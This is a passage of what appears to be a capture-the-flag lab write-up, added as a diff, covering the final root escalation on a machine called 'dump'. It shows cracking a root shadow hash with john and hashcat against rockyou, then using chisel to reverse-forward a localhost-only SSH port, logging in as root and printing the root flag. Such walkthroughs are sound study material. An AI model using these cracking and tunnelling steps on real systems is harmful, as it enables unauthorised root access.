@@ -267,3 +267,98 @@ shellinabox:*:19762:0:99999:7:::
 ```
 
 Now we "just" need to crack it (we still cant use su)
+
+``` bash
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
+Use the "--format=HMAC-SHA256" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+shadow123        (root)     
+1g 0:00:00:01 DONE (2025-04-03 18:02) 0.6944g/s 5688p/s 5688c/s 5688C/s somebody..whitetiger
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+So it was shadow123
+
+As a PoC using hashcat itd be:
+
+``` bash
+hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt
+```
+
+In linpeas we saw:
+
+``` bash
+╔══════════╣ Active Ports
+
+╚ [https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#op](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#op)
+
+en-ports                                                                            
+
+tcp     LISTEN   0        128              0.0.0.0:4200          0.0.0.0:*      
+
+tcp     LISTEN   0        100              0.0.0.0:21            0.0.0.0:*      
+
+tcp     LISTEN   0        128            127.0.0.1:22            0.0.0.0:*      
+
+tcp     LISTEN   0        128                    *:80                  *:*
+```
+
+Which means something is actually being locally served on port 22
+
+``` bash
+dumper@dump:~$ ls -lhaF /usr/bin | grep ssh                                         
+
+lrwxrwxrwx  1 root root       3 dic 24  2023 slogin -> ssh
+
+----------  1 root root    715K dic 24  2023 ssh
+
+-rwxr-xr-x  1 root root    335K dic 24  2023 ssh-add*
+
+-rwxr-sr-x  1 root ssh     315K dic 24  2023 ssh-agent*
+
+-rwxr-xr-x  1 root root    1,5K dic 22  2023 ssh-argv0*
+
+-rwxr-xr-x  1 root root     11K oct 17  2018 ssh-copy-id*
+
+-rwxr-xr-x  1 root root    407K dic 24  2023 ssh-keygen*
+
+-rwxr-xr-x  1 root root    411K dic 24  2023 ssh-keyscan*
+```
+
+It seems we cannot run bare ssh.
+
+A simple solution would be port forwarding any port on 0.0.0.0 to 127.0.0.1 port 22. This way we should be able to connect to it from our host (in which we can run ssh). But we cant do this SSH pivoting with nc, wed need ncat or socat (which we dont have) so we will need to run chisel.
+
+We check the architecture via ``` uname -r ```, transfer the binary via wget and run a server with:
+
+``` bash 
+./chisel server -p 4444 --reverse
+```
+
+Now from our attacking machine:
+
+``` bash
+chisel client -v 192.168.56.111:4444 1234:127.0.0.1:22
+```
+
+Now from the attacker we simply do:
+
+``` bash
+ssh root@127.0.0.1 -p 1234
+```
+
+And we are root.
+
+``` bash
+root@dump:~# cat /root/root.txt
+60c60f8e926b65a55bf8bd6239bb616d
+```
+
+
